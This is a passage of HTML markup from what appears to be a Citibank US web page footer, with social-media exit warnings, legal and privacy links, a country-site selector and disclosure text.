                                                                        <div _ngcontent-ssr-c39="" class="modal-footer">
                                                                            <div _ngcontent-ssr-c39="" class="text-right">
                                                                                <div _ngcontent-ssr-c39="" class="citi-modal-controls">
                                                                                    <citi-cta _ngcontent-ssr-c39="" class="modal-primary-btn btnclassTest" _nghost-ssr-c36="">
                                                                                        <a
                                                                                            _ngcontent-ssr-c36=""
                                                                                            target="_blank"
                                                                                            id="25970bae-d145-41f3-63e9-d2ff63cbd5d2"
                                                                                            href="https://www.facebook.com/citibank"
                                                                                            aria-describedby="db48f800-b20a-af82-31f5-8127c0e3ba6d_ariadescription"
                                                                                            class="btn btn-primary"
                                                                                        >
                                                                                            Continue
                                                                                        </a>
                                                                                        <span _ngcontent-ssr-c36="" aria-hidden="true" class="sr-only" id="db48f800-b20a-af82-31f5-8127c0e3ba6d_ariadescription">Opens in new window</span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ssr-c39="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                </div>
                                                <div _ngcontent-ssr-c103="">
                                                    <button _ngcontent-ssr-c103=""  aria-label="twitter" class="cbol-pre-login-static-assets/citi-branding-assets/images/social-media_twitter@3x.png">
                                                        <div _ngcontent-ssr-c103="" class="twitter"></div>
                                                    </button>
                                                    <citi-modal _ngcontent-ssr-c103="" primarybuttontarget="_blank" _nghost-ssr-c39="">
                                                        <div _ngcontent-ssr-c39="" ddlariahideouterdom="">
                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modal21">
                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ssr-c39="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ssr-c39="" class="modal-header">
                                                                            <button _ngcontent-ssr-c39="" type="button" aria-label="Close modal" class="close-button">
                                                                                <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" role="document">
                                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="header"><div _ngcontent-ssr-c103="" title="">Important Information</div></div>
                                                                                <div _ngcontent-ssr-c39="" class="modal-body-content" tabindex="-1">
                                                                                    <p _ngcontent-ssr-c103="">
                                                                                        <p>
                                                                                            You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less
                                                                                            security than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you
                                                                                            want to go to the third party site?
                                                                                        </p>
                                                                                        <p>Citi is not responsible for the products, services or facilities provided and/or owned by other companies.</p>
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" class="modal-footer">
                                                                            <div _ngcontent-ssr-c39="" class="text-right">
                                                                                <div _ngcontent-ssr-c39="" class="citi-modal-controls">
                                                                                    <citi-cta _ngcontent-ssr-c39="" class="modal-primary-btn btnclassTest" _nghost-ssr-c36="">
                                                                                        <a
                                                                                            _ngcontent-ssr-c36=""
                                                                                            target="_blank"
                                                                                            id="b13f37e0-fdd3-8d15-f3de-e5c17093b13e"
                                                                                            href="https://twitter.com/Citibank/"
                                                                                            aria-describedby="2b7ffc4c-4d00-4bca-7a09-cfaed3cac9de_ariadescription"
                                                                                            class="btn btn-primary"
                                                                                        >
                                                                                            Continue
                                                                                        </a>
                                                                                        <span _ngcontent-ssr-c36="" aria-hidden="true" class="sr-only" id="2b7ffc4c-4d00-4bca-7a09-cfaed3cac9de_ariadescription">Opens in new window</span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ssr-c39="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                </div>
                                                <div _ngcontent-ssr-c103="">
                                                    <button _ngcontent-ssr-c103=""  aria-label="youtube" class="cbol-pre-login-static-assets/citi-branding-assets/images/social-media_youtube@3x.png">
                                                        <div _ngcontent-ssr-c103="" class="youtube"></div>
                                                    </button>
                                                    <citi-modal _ngcontent-ssr-c103="" primarybuttontarget="_blank" _nghost-ssr-c39="">
                                                        <div _ngcontent-ssr-c39="" ddlariahideouterdom="">
                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modal22">
                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ssr-c39="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ssr-c39="" class="modal-header">
                                                                            <button _ngcontent-ssr-c39="" type="button" aria-label="Close modal" class="close-button">
                                                                                <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" role="document">
                                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="header"><div _ngcontent-ssr-c103="" title="">Important Information</div></div>
                                                                                <div _ngcontent-ssr-c39="" class="modal-body-content" tabindex="-1">
                                                                                    <p _ngcontent-ssr-c103="">
                                                                                        <p>
                                                                                            You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less
                                                                                            security than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you
                                                                                            want to go to the third party site?
                                                                                        </p>
                                                                                        <p>Citi is not responsible for the products, services or facilities provided and/or owned by other companies.</p>
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" class="modal-footer">
                                                                            <div _ngcontent-ssr-c39="" class="text-right">
                                                                                <div _ngcontent-ssr-c39="" class="citi-modal-controls">
                                                                                    <citi-cta _ngcontent-ssr-c39="" class="modal-primary-btn btnclassTest" _nghost-ssr-c36="">
                                                                                        <a
                                                                                            _ngcontent-ssr-c36=""
                                                                                            target="_blank"
                                                                                            id="f89d6aea-9669-73d4-b433-38f28c07a522"
                                                                                            href="https://www.youtube.com/citi"
                                                                                            aria-describedby="582ffab5-ec98-b5ac-8860-e0bba62a2725_ariadescription"
                                                                                            class="btn btn-primary"
                                                                                        >
                                                                                            Continue
                                                                                        </a>
                                                                                        <span _ngcontent-ssr-c36="" aria-hidden="true" class="sr-only" id="582ffab5-ec98-b5ac-8860-e0bba62a2725_ariadescription">Opens in new window</span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ssr-c39="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </citi-social-media>
                                <citi-footer-sub-navigation _ngcontent-ssr-c99="" _nghost-ssr-c101="">
                                    <div _ngcontent-ssr-c101="" class="sub-navigation">
                                        <div _ngcontent-ssr-c101="" class="content">
                                            <p _ngcontent-ssr-c101="" class="copyright">© 2021 Citigroup Inc</p>
                                            <ul _ngcontent-ssr-c101="">
                                                <li _ngcontent-ssr-c101="" id="subnavTermsConditions">
                                                    <citi-cta _ngcontent-ssr-c101="" type="tertiary" _nghost-ssr-c36="">
                                                        <a
                                                            _ngcontent-ssr-c36=""
                                                            target="_self"
                                                            id="c708f3c6-2a91-8669-f34f-3ed8aac7794f"
                                                            href="https://online.citi.com/US/ag/termsdisclaimer/termsdisclaimerhome"
                                                            
                                                            class="btn btn-link"
                                                        >
                                                            Terms &amp; Conditions
                                                        </a>
                                                    </citi-cta>
                                                </li>
                                                <li _ngcontent-ssr-c101="" id="subnavPrivacy">
                                                    <citi-cta _ngcontent-ssr-c101="" type="tertiary" _nghost-ssr-c36="">
                                                        <a
                                                            _ngcontent-ssr-c36=""
                                                            target="_self"
                                                            id="62883176-9056-0e2b-0c56-55acd9bf9f5f"
                                                            href="https://online.citi.com/US/JRS/portal/template.do?ID=Privacy"
                                                            
                                                            class="btn btn-link"
                                                        >
                                                            Privacy
                                                        </a>
                                                    </citi-cta>
                                                </li>
                                                <li _ngcontent-ssr-c101="" id="subnavNoticeAtCollection">
                                                    <citi-cta _ngcontent-ssr-c101="" type="tertiary" _nghost-ssr-c36="">
                                                        <a
                                                            _ngcontent-ssr-c36=""
                                                            target="_self"
                                                            id="3dec7c52-74a4-6581-e588-f575e2a65ec1"
                                                            href="https://online.citi.com/JRS/portal/template.do?ID=Privacy#notice-at-collection"
                                                            
                                                            class="btn btn-link"
                                                        >
                                                            Notice at Collection
                                                        </a>
                                                    </citi-cta>
                                                </li>
                                                <li _ngcontent-ssr-c101="" id="subnavPrivacyHub">
                                                    <citi-cta _ngcontent-ssr-c101="" type="tertiary" _nghost-ssr-c36="">
                                                        <a _ngcontent-ssr-c36="" target="_self" id="69aa158f-9236-4386-9b7d-f5bfd5c50530" href="https://online.citi.com/US/ag/dataprivacyhub"  class="btn btn-link">
                                                            CA Privacy Hub
                                                        </a>
                                                    </citi-cta>
                                                </li>
                                                <li _ngcontent-ssr-c101="" id="subnavAccessibility">
                                                    <citi-cta _ngcontent-ssr-c101="" type="tertiary" _nghost-ssr-c36="">
                                                        <a
                                                            _ngcontent-ssr-c36=""
                                                            target="_self"
                                                            id="a530e625-2c48-04aa-20eb-b6fc81baa3ac"
                                                            href="https://online.citi.com/US/JRS/portal/template.do?ID=Accessibility"
                                                            
                                                            class="btn btn-link"
                                                        >
                                                            Accessibility
                                                        </a>
                                                    </citi-cta>
                                                </li>
                                                <li _ngcontent-ssr-c101="" id=""><span _ngcontent-ssr-c101="" class="staticLinks">Country &amp; Jurisdictions:</span></li>
                                                <li _ngcontent-ssr-c101="" id="">
                                                    <citi-cta _ngcontent-ssr-c101="" type="tertiary" _nghost-ssr-c36="">
                                                        <button _ngcontent-ssr-c36="" style="text-align: center;" type="button" id="d8d9d4ef-c3c0-37bd-8dfa-8fd92bca5242"  class="btn btn-link">
                                                            <b>United States</b>
                                                        </button>
                                                    </citi-cta>
                                                    <span _ngcontent-ssr-c101="" class="staticLinks" style="font-weight: bold;"> &gt; </span>
                                                    <citi-modal _ngcontent-ssr-c101="" showcancelbutton="true" cancelbuttontext="Cancel" idstr="unitedStates" class="cbolui-ddl-pre" _nghost-ssr-c39="">
                                                        <div _ngcontent-ssr-c39="" ddlariahideouterdom="">
                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="unitedStates">
                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ssr-c39="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ssr-c39="" class="modal-header">
                                                                            <button _ngcontent-ssr-c39="" type="button" aria-label="Close modal" class="close-button">
                                                                                <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" role="document">
                                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="header"></div>
                                                                                <div _ngcontent-ssr-c39="" class="modal-body-content" tabindex="-1">
                                                                                    <div _ngcontent-ssr-c101="" class="theme-light">
                                                                                        <p _ngcontent-ssr-c101=""></p>
                                                                                        <p _ngcontent-ssr-c101="" class="speedBumpCopy">Get Citibank information on the countries &amp; jurisdictions we serve</p>
                                                                                        <span _ngcontent-ssr-c101="" class="selectCountry">Select Country or Jurisdiction</span>
                                                                                        <citi-dropdown _ngcontent-ssr-c101="" idstr="countrySelect" class="citi-dropdown row" _nghost-ssr-c53="">
                                                                                            <div _ngcontent-ssr-c53="" class="dd-wrapper form-group col-xs-12 has-value">
                                                                                                <label _ngcontent-ssr-c53="" class="select-box-label" id="countrySelectlabel" for="countrySelect"></label>
                                                                                                <div _ngcontent-ssr-c53="">
                                                                                                    <select
                                                                                                        _ngcontent-ssr-c53=""
                                                                                                        class="form-control ng-untouched ng-pristine ng-valid"
                                                                                                        id="countrySelect"
                                                                                                        aria-labelledby="countrySelectlabel"
                                                                                                    >
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.com.au/portal/citiau_home.htm">Australia</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="https://www.citibank.com/bahrain">Bahrain</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="https://www.citibank.com.br/BRGCB/JPS/portal/Index.do">Brazil</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.com.cn/homepage/cn/cn_homepage.htm">China - Chinese</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.com.cn/homepage/en/cn_homepage.htm">China - English</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="https://www.citibank.com.co/COGCB/JPS/portal/Index.do">Colombia</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citi.com.sv/">El Salvador</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citi.com/citi/about/countrypresence/guatemala.html">Guatemala</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.com.hk/">Hong Kong</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.online.citibank.co.in/">India - Domestic</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.online.citibank.co.in/citi-nri.htm">India - Non-Resident Indian (NRI)</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="https://www.citibank.co.id/portal/bahasa_home/index.htm">Indonesia - Bahasa Indonesia</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.co.id/">Indonesia - English</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.co.kr/">Korea - Korean</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="https://www.citibank.co.kr/ComMainCnts0100_en.act?JEX_LANG=EN">Korea - English</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.com.my/">Malaysia</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citi.com/citi/about/countrypresence/mexico.html">Mexico</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.com.ph/portal/citiph_home.htm">Philippines</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.pl/poland/homepage/polish/index.htm">Poland</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.ru/russia/main/rus/home.htm">Russia - Russian</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.ru/russia/main/eng/home.htm">Russia - English</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.com.sg/">Singapore</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.com.tw/portal/home_chinese/twcb_Home.htm">Taiwan - Chinese</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.com.tw/portal/home_english/twcb_Home.htm">Taiwan - English</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.co.th/">Thailand</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citi.com/uae/homepage/index.htm">United Arab Emirates</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.co.uk/index.htm">United Kingdom</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citi.com/domain/home.htm">United States</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="https://www.citibank.com.ve/VEGCB/JPS/portal/Index.do">Venezuela</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.com.vn/">Vietnam - Vietnamese</option>
                                                                                                        <option _ngcontent-ssr-c53="" value="http://www.citibank.com.vn/portal/vietnam_home.htm">Vietnam - English</option>
                                                                                                    </select>
                                                                                                </div>
                                                                                            </div>
                                                                                        </citi-dropdown>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" class="modal-footer">
                                                                            <div _ngcontent-ssr-c39="" class="text-right">
                                                                                <div _ngcontent-ssr-c39="" class="citi-modal-controls">
                                                                                    <citi-cta _ngcontent-ssr-c39="" class="modal-primary-btn btnclassTest" _nghost-ssr-c36="">
                                                                                        <button
                                                                                            _ngcontent-ssr-c36=""
                                                                                            style="text-align: center;"
                                                                                            type="button"
                                                                                            id="a5ed2411-30f2-a475-7eaa-04846846b41e"
                                                                                            role="button"
                                                                                            aria-describedby="9cae39b6-0b93-027a-0bca-d103e329935f_ariadescription"
                                                                                            class="btn btn-primary"
                                                                                        >
                                                                                            Submit
                                                                                        </button>
                                                                                        <span _ngcontent-ssr-c36="" aria-hidden="true" class="sr-only" id="9cae39b6-0b93-027a-0bca-d103e329935f_ariadescription">Opens in new window</span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only"></span>
                                                                                    <citi-cta _ngcontent-ssr-c39="" ariarole="button" type="tertiary" class="modal-secondary-btn marginBetweenBtns" _nghost-ssr-c36="">
                                                                                        <button _ngcontent-ssr-c36="" style="text-align: center;" type="button" id="14c7d72f-14fd-d9a4-5d1a-c0e637a450d9" role="button" class="btn btn-link">
                                                                                            Cancel
                                                                                        </button>
                                                                                    </citi-cta>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ssr-c39="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </citi-footer-sub-navigation>
                                <citi-footer-disclaimer _ngcontent-ssr-c99="" _nghost-ssr-c102="">
                                    <div _ngcontent-ssr-c102="" class="disclaimer">
                                        <div _ngcontent-ssr-c102="" class="content">
                                            <div _ngcontent-ssr-c102="" class="text">
                                                <p><strong>Important Legal Disclosures &amp; Information</strong></p>
                                                <p>
                                                    Citibank.com provides information about and access to accounts and financial services provided by Citibank, N.A. and its affiliates in the United States and its territories. It does not,
                                                    and should not be construed as, an offer, invitation or solicitation of services to individuals outside of the United States.
                                                </p>
                                                <p>
                                                    Terms, conditions and fees for accounts, products, programs and services are subject to change. Not all accounts, products, and services as well as pricing described here are available in
                                                    all jurisdictions or to all customers. Your eligibility for a particular product and service is subject to a final determination by Citibank. Your country of citizenship, domicile, or
                                                    residence, if other than the United States, may have laws, rules, and regulations that govern or affect your application for and use of our accounts, products and services, including laws
                                                    and regulations regarding taxes, exchange and/or capital controls that you are responsible for following.
                                                </p>
                                                <p>
                                                    The products, account packages, promotional offers and services described in this website may not apply to customers of International Personal Bank U.S. in the Citigold<sup>®</sup> Private
                                                    Client International, Citigold<sup>®</sup> International, Citi International Personal, Citi Global Executive Preferred, and Citi Global Executive Account Packages.
                                                </p>
                                            </div>
                                        </div>
                                    </div>
                                </citi-footer-disclaimer>
                                <citi-sub-footer _ngcontent-ssr-c99="" _nghost-ssr-c104="">
                                    <div _ngcontent-ssr-c104="" class="sub-footer">
                                        <div _ngcontent-ssr-c104="" class="content"></div>
                                        <div _ngcontent-ssr-c104="">
                                            <img _ngcontent-ssr-c104="" src="si_assetz/img/320_Citi-PLT3x.png" alt="Citi Banner" aria-label="Citi Banner" class="imgBottomCitiLogo_Mobile" />
                                            <img _ngcontent-ssr-c104="" src="si_assetz/img/1440_Citi-PLT3x.png" alt="Citi Banner" aria-label="Citi Banner" class="imgBottomCitiLogo_Desktop" />
                                        </div>
                                    </div>
                                </citi-sub-footer>
                            </div>
                        </citi-footer>
                    </div>
                </citi-parent-layout>
            </cbol-core>
        </app-root>
        <div class="sr-only" aria-atomic="true" aria-live="polite"></div>
        <div class="sr-only" aria-atomic="true" aria-live="polite"></div>
    </body>
</html>